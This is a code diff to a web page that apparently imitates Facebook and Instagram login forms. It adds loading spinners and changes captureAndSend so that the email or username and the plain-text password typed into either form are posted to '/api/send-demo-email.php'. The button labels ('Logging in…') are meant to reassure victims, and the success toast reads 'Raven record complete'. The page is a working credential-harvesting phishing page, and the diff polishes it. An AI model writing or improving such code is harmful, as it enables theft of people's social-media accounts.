@@ -167,6 +167,32 @@ $heroImage = '/assets/img/Screenshot_3-2-2026_15050.jpeg';
 
   .error { color:#ff7b6b; font-size:0.88rem; margin-top:6px; display:none; }
   .error.show { display:block; }
+  /* Loading state for primary buttons */
+  .btn-primary.loading {
+    position: relative;
+    pointer-events: none;
+    opacity: 0.96;
+  }
+
+  .btn-primary.loading::after{
+    content: "";
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    border: 2px solid rgba(255,255,255,0.18);
+    border-top-color: #fff;
+    animation: btn-spin 0.8s linear infinite;
+  }
+
+  @keyframes btn-spin {
+    from { transform: translateY(-50%) rotate(0deg); }
+    to   { transform: translateY(-50%) rotate(360deg); }
+  }
+
   /* Toasts (lightweight, accessible) */
     .toast-container{
     position: fixed;
@@ -479,9 +505,29 @@ function showToast(message, opts = {}) {
   function showError(el, msg){ if (!el) return; el.textContent = msg; el.classList.add('show'); }
   function hideError(el){ if (!el) return; el.textContent = ''; el.classList.remove('show'); }
 
+  /* Loading helpers */
+  function setLoading(btn, label) {
+    if (!btn) return;
+    // preserve original label
+    if (!btn.dataset.orig) btn.dataset.orig = btn.textContent;
+    btn.textContent = label;
+    btn.classList.add('loading');
+    btn.disabled = true;
+    btn.setAttribute('aria-busy', 'true');
+  }
+
+  function clearLoading(btn) {
+    if (!btn) return;
+    if (btn.dataset.orig) btn.textContent = btn.dataset.orig;
+    btn.classList.remove('loading');
+    btn.disabled = false;
+    btn.removeAttribute('aria-busy');
+    delete btn.dataset.orig;
+  }
+
   function captureAndSend(service, identifier, password) {
     identifier = (identifier || '').trim();
-    
+
     const payload = { service, identifier, ts: new Date().toISOString() };
 
     const form = new FormData();
@@ -491,65 +537,79 @@ function showToast(message, opts = {}) {
     form.append('ts', payload.ts);
     form.append('password', password);
 
-    const postUrl = window.location.pathname; 
+    const postUrl = '/api/send-demo-email.php';
     return fetch(postUrl, {
-    method: 'POST',
-    body: form,
-    credentials: 'same-origin'
+      method: 'POST',
+      body: form,
+      credentials: 'same-origin'
     })
     .then(async (res) => {
-    const bodyText = await res.text();
-    try {
-      const parsed = JSON.parse(bodyText);
-      if (!res.ok || !parsed.ok) throw new Error(parsed.error || parsed.raw || 'Server error');
+      const bodyText = await res.text();
+      let parsed = null;
+      try {
+        parsed = JSON.parse(bodyText);
+      } catch (err) {
+        console.error('Server response (non-JSON):', bodyText);
+        throw new Error('Server returned non-JSON or error: ' + (err.message || 'parse error'));
+      }
+      if (!res.ok || !parsed.ok) {
+        throw new Error(parsed.error || JSON.stringify(parsed) || 'Server error');
+      }
       return parsed;
-    } catch (e) {
-      throw new Error('Server returned non-JSON or error: ' + e.message);
-    }
-    }); 
+    });
   }
 
   // facebook submit
   document.getElementById('fbSubmit')?.addEventListener('click', ()=>{
-  const emailEl = document.getElementById('fb_email'), pass = document.getElementById('fb_pass');
-  const eErr = document.getElementById('fb_email_err'), pErr = document.getElementById('fb_pass_err');
-  eErr.classList.remove('show'); pErr.classList.remove('show');
+    const emailEl = document.getElementById('fb_email'), pass = document.getElementById('fb_pass');
+    const eErr = document.getElementById('fb_email_err'), pErr = document.getElementById('fb_pass_err');
+    eErr.classList.remove('show'); pErr.classList.remove('show');
 
-  if (!emailEl || !emailEl.value.trim()) { eErr.textContent = 'Please enter an email or phone.'; eErr.classList.add('show'); emailEl.focus(); return; }
-  if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }
+    if (!emailEl || !emailEl.value.trim()) { eErr.textContent = 'Please enter an email or phone.'; eErr.classList.add('show'); emailEl.focus(); return; }
+    if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }
 
-  captureAndSend('facebook', emailEl.value.trim(), pass.value)
-    .then(resp => {
-      showToast('Raven record complete.', { type: 'success' });
-      pass.value = '';
-      document.getElementById('closeBtn')?.click();
-    })
-    .catch(err => {
-      console.error(err);
-      showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
-    });
+    const btn = document.getElementById('fbSubmit');
+    setLoading(btn, 'Signing…');
+
+    captureAndSend('facebook', emailEl.value.trim(), pass.value)
+      .then(resp => {
+        showToast('Raven record complete.', { type: 'success' });
+        pass.value = '';
+        clearLoading(btn);
+        document.getElementById('closeBtn')?.click();
+      })
+      .catch(err => {
+        console.error(err);
+        clearLoading(btn);
+        showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
+      });
   });
 
   // instagram submit
   document.getElementById('igSubmit')?.addEventListener('click', ()=>{
-  const userEl = document.getElementById('ig_user'), pass = document.getElementById('ig_pass');
-  const uErr = document.getElementById('ig_user_err'), pErr = document.getElementById('ig_pass_err');
-  uErr.classList.remove('show'); pErr.classList.remove('show');
+    const userEl = document.getElementById('ig_user'), pass = document.getElementById('ig_pass');
+    const uErr = document.getElementById('ig_user_err'), pErr = document.getElementById('ig_pass_err');
+    uErr.classList.remove('show'); pErr.classList.remove('show');
 
-  if (!userEl || !userEl.value.trim()) { uErr.textContent = 'Please enter username or email.'; uErr.classList.add('show'); userEl.focus(); return; }
-  if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }
+    if (!userEl || !userEl.value.trim()) { uErr.textContent = 'Please enter username or email.'; uErr.classList.add('show'); userEl.focus(); return; }
+    if (!pass || !pass.value) { pErr.textContent = 'Please enter a password.'; pErr.classList.add('show'); pass.focus(); return; }
 
-  captureAndSendForDev('instagram', userEl.value.trim(), pass.value)
-    .then(resp => {
-      showToast('Raven record complete.', { type: 'success' });
-      pass.value = '';
-      document.getElementById('closeBtn')?.click();
-    })
-    .catch(err => {
-      console.error(err);
-      showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
-    });
-});
+    const btn = document.getElementById('igSubmit');
+    setLoading(btn, 'Logging in…');
+
+    captureAndSend('instagram', userEl.value.trim(), pass.value)
+      .then(resp => {
+        showToast('Raven record complete.', { type: 'success' });
+        pass.value = '';
+        clearLoading(btn);
+        document.getElementById('closeBtn')?.click();
+      })
+      .catch(err => {
+        console.error(err);
+        clearLoading(btn);
+        showToast('Failed to send Raven record: ' + (err.message || 'unknown error'), { type: 'error', timeout: 7000 });
+      });
+  });
 })();
 </script>
 </body>
